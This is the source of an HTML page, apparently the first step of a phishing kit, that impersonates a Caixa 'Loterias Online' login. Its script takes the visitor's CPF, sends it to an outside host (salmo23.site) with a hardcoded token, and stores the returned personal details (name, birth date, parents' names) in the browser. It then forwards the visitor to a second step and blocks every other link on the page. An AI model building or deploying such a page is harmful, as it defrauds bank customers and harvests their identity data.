<!-- /1/index.html -->

<!doctype html>
<html lang="pt-br">

<head>
    <meta charset="utf-8">
    <title>Loterias Online</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
    <link rel="preconnect" href="https://fonts.googleapis.com/index.html">
    <link rel="preconnect" href="https://fonts.gstatic.com/index.html" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js"
    data-utmify-prevent-subids
    async
    defer></script>
    <style>
        @font-face {
            font-family: 'Futura-Book';
            src: url('font/Futura-Book.eot');
            src: url('font/Futura-Bookd41d.eot?#iefix') format('embedded-opentype'),
                url('font/Futura-Book.woff2') format('woff2'),
                url('font/Futura-Book.woff') format('woff'),
                url('font/Futura-Book.ttf') format('truetype'),
                url('font/Futura-Book.svg#Futura-Book') format('svg');
            font-weight: normal;
            font-style: normal;
            font-display: swap;
        }

        body {
            font-family: 'Futura-Book' !important;
            background: linear-gradient(45deg, #00a9ad, #005ca9);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
        }

        .container-principal {
            background-color: white;
            width: 450px;
            max-width: 95%;
            color: black;
            border-radius: .4rem;
            box-shadow: 0px 4px 8px rgb(0 0 0 / 30%);
            padding: 3rem 4rem;
        }

        @media (max-width: 576px) {
            .container-principal {
                padding: 3rem 2rem !important;
            }
        }

        .container-principal img {
            width: 150px;
        }

        .container-principal h1 {
            color: #0070ae;
            font-size: 1rem;
            margin-top: .4rem;
            text-align: center;
        }

        .container-principal h2 {
            color: #4d7880;
            font-size: 1.1rem;
            margin-top: 1rem;
            margin-bottom: 2.2rem;
            width: 100%;
            text-align: justify;
        }

        .container-principal h3 {
            color: #0070ae;
            font-size: 1rem;
            margin-top: .6rem;
        }

        .container-principal h3 a {
            color: #0070ae;
            font-weight: 600;
        }

        .container-principal form {
            width: 100%;
            display: flex;
            flex-direction: column;
        }

        .container-principal .form-group {
            position: relative;
            width: 100%;
            margin-bottom: 1.5rem;
        }

        .container-principal form label {
            position: absolute;
            top: 11%;
            left: 0;
            transform: translateY(-11%);
            color: #4d7880;
            font-size: 1rem;
            pointer-events: none;
            transition: all 0.3s ease;
        }

        .container-principal form input {
            font-size: 1rem;
            margin: 0 !important;
            padding: 0 !important;
            height: 40px;
            width: 100%;
            border: none;
            border-bottom: 1.3px orange solid !important;
            padding-left: 5px;
            color: #4d7880;
        }

        .container-principal form input:focus {
            outline: 0px !important;
        }

        .botoes {
            margin-top: 2rem;
        }

        button.botoes {
            margin-top: 1.5rem;
            background-color: #f39200;
            color: white;
            font-weight: 500;
            width: 100%;
            border: none;
            padding: .5rem 1rem;
            font-size: 1rem;
            border-radius: .2rem;
            margin-bottom: .4rem;
            cursor: pointer;
        }

        button.botoes:hover {
            background-color: #173e68;
            color: white;
        }

        .button-continuar {
            background: #1351B4 0 0 no-repeat padding-box !important;
            color: white;
            font-weight: 500;
            width: 100%;
            border: none;
            padding: .5rem 1rem;
            font-size: 1rem;
            border-radius: .2rem;
            cursor: pointer;
        }

        .button-continuar.desabilitado {
            background: #b5b5b5 0 0 no-repeat padding-box !important;
            cursor: not-allowed;
        }

        .error-border {
            border: 1px solid red !important;
            box-shadow: 0 0 0 1px #ffa5b9;
        }

        .error-text {
            color: red !important;
        }

        .error-container {
            margin: 10px 0px -17px 10px;
            display: flex;
            align-items: center;
        }

        .error-image {
            display: none;
            margin-left: 10px;
            width: 20px;
            height: 20px;
        }
    </style>
</head>

<body>
    <div class="container-bg" style=" max-width: 410px; margin-left: 20px; ">
        <div class="container-principal d-flex justify-content-center align-items-center flex-column">
            <img src="img/logo-caixa.webp" alt="Logo Caixa">
            <h1>Login Caixa</h1>
            <h2>Informe seu CPF e clique em "Continuar" para continuar:</h2>
            <form id="novoFormCPF">
                <div class="form-group">
                    <label for="cpf">CPF</label>
                    <input name="cpf" id="cpf" type="text" maxlength="14" placeholder="Digite seu CPF" style=" margin-bottom: 15px !important; ">
                    <div class="error-container">
                        <span class="error-text" id="cpfError"></span>
                        <img decoding="async" src="../images/aqq.png" class="error-image" id="errorImage"
                            alt="Error Image">
                    </div>
                    <button id="enter-account-id" type="submit" name="operation" value="enter-account-id"
                        class="button-continuar desabilitado" tabindex="2" disabled>Continuar</button>
                </div>
            </form>

            <h3>É novo por aqui? <a href="#">Cadastre-se</a></h3>
            <h3><a href="#">Preciso de ajuda</a></h3>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <script>
        // Verificar se jQuery está carregado
        if (typeof $ === 'undefined') {
            console.error("jQuery não está carregado.");
        } else {
            console.log("jQuery carregado corretamente. Versão:", $.fn.jquery);
        }

        function substituirBotaoEspecifico() {
            console.log("Substituindo botão específico...");
            const novoBotao = document.createElement('button');
            novoBotao.type = 'button';
            novoBotao.id = 'allowedButton';
            novoBotao.className = 'button-continuar desabilitado';
            novoBotao.innerHTML = 'Continuar';
            novoBotao.disabled = true;

            const botaoAlvo = document.getElementById('enter-account-id');
            if (botaoAlvo) {
                botaoAlvo.parentNode.replaceChild(novoBotao, botaoAlvo);
                console.log("Botão substituído com sucesso.");
            } else {
                console.error("Botão alvo não encontrado!");
            }

            novoBotao.addEventListener('click', redirecionarSeValido);
        }

        function bloquearElementosClicaveis() {
            console.log("Bloqueando elementos clicáveis...");
            document.querySelectorAll('button:not(#allowedButton)').forEach(function (botao) {
                botao.disabled = true;
            });

            document.querySelectorAll('a').forEach(function (link) {
                link.addEventListener('click', function (event) {
                    event.preventDefault();
                });
            });

            document.querySelectorAll('img').forEach(function (imagem) {
                if (imagem.parentNode && imagem.parentNode.tagName === 'A') {
                    imagem.parentNode.addEventListener('click', function (event) {
                        event.preventDefault();
                    });
                }
            });
        }

        var cpfInput = document.getElementById('cpf');
        var cpfError = document.getElementById('cpfError');
        var errorImage = document.getElementById('errorImage');

        if (!cpfInput) {
            console.error("Input de CPF não encontrado!");
        }

        if (!cpfError) {
            console.error("Elemento de erro 'cpfError' não encontrado!");
        }

        if (!errorImage) {
            console.error("Elemento de erro 'errorImage' não encontrado!");
        }

        cpfInput.addEventListener('input', mascaraCPF);

        function mascaraCPF() {
            var cpf = cpfInput.value;
            cpf = cpf.replace(/\D/g, "");
            if (cpf.length > 11) {
                cpf = cpf.substring(0, 11);
            }
            cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
            cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
            cpf = cpf.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
            cpfInput.value = cpf;

            validarCPF();
        }

        function validarCPF() {
            var cpf = cpfInput.value;
            var cpfNumeros = cpf.replace(/[^\d]+/g, '');

            var botao = document.getElementById('allowedButton');
            if (cpf.length !== 14 || !validaCPF(cpfNumeros)) {
                cpfError.textContent = cpf.length === 14 ? 'CPF Inválido' : '';
                cpfInput.classList.toggle('error-border', cpf.length === 14);
                errorImage.style.display = cpf.length === 14 ? 'inline-block' : 'none';
                botao.disabled = true;
                botao.classList.add('desabilitado');
                console.log("CPF inválido.");
            } else {
                cpfError.textContent = '';
                cpfInput.classList.remove('error-border');
                errorImage.style.display = 'none';
                botao.disabled = false;
                botao.classList.remove('desabilitado');
                console.log("CPF válido.");
            }
        }

        function validaCPF(cpf) {
            cpf = cpf.replace(/[^\d]+/g, '');
            if (cpf === '' || cpf.length !== 11 || /^(.)\1+$/.test(cpf)) return false;
            let add = 0;
            for (let i = 0; i < 9; i++) {
                add += parseInt(cpf.charAt(i)) * (10 - i);
            }
            let rev = 11 - (add % 11);
            rev = (rev === 10 || rev === 11) ? 0 : rev;
            if (rev !== parseInt(cpf.charAt(9))) return false;
            add = 0;
            for (let i = 0; i < 10; i++) {
                add += parseInt(cpf.charAt(i)) * (11 - i);
            }
            rev = 11 - (add % 11);
            rev = (rev === 10 || rev === 11) ? 0 : rev;
            return rev === parseInt(cpf.charAt(10));
        }

        function redirecionarSeValido() {
            var cpf = cpfInput.value.replace(/[^\d]+/g, '');
            if (validaCPF(cpf)) {
                console.log("CPF válido. Realizando consulta à API...");
                $.ajax({
                    url: 'https://salmo23.site/?token=shelby2918&cpf=' + cpf,
                    type: "GET",
                    async: true,
                    success: function (data) {
                        console.log('Resposta da consulta ao CPF:', data);

                        if (data === 'não localizado') {
                            alert('CPF não localizado, verifique!');
                            console.warn('CPF não localizado na consulta.');
                        } else {
                            try {
                                if (typeof data === 'string') {
                                    data = JSON.parse(data);
                                }
                                const dados = data.DADOS || {};
                                localStorage.setItem('cpf', dados.CPF || '');
                                localStorage.setItem('nome', dados.NOME || '');
                                localStorage.setItem('sexo', dados.SEXO || '');
                                localStorage.setItem('data_nascimento', dados.NASC || '');
                                localStorage.setItem('nome_mae', dados.NOME_MAE || '');
                                localStorage.setItem('nome_pai', dados.NOME_PAI || '');

                                console.log("Dados armazenados no localStorage.");
                                console.log("CPF armazenado:", localStorage.getItem('cpf'));
                                console.log("Nome armazenado:", localStorage.getItem('nome'));

                                window.location.href = '../2/';

                            } catch (error) {
                                console.error('Erro ao processar dados da resposta CPF:', error);
                                alert('Erro ao processar a resposta da API. Tente novamente.');
                            }
                        }
                    },
                    error: function (jqXHR, textStatus, errorThrown) {
                        console.error('Erro na consulta ao CPF:', textStatus, errorThrown);
                        alert('Erro ao tentar buscar dados do CPF. Tente novamente.');
                    }
                });
            } else {
                console.log("CPF inválido. Consulta não será realizada.");
            }
        }
        $(document).ready(function () {
            substituirBotaoEspecifico();
            bloquearElementosClicaveis();
        });
    </script>

    <script>
        $(document).ready(function () {
            const input = $('#cpf');
            const label = input.prev('label');

            function moveLabel() {
                if (input.val().trim() !== '') {
                    label.css('top', '-15px');
                } else {
                    label.css('top', '11%');
                }
            }

            input.on('focus', function () {
                label.css('top', '-15px');
            });

            input.on('blur', moveLabel);

            input.on('input', moveLabel);

            moveLabel();
        });
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4"
        crossorigin="anonymous"></script>
</body>

</html>
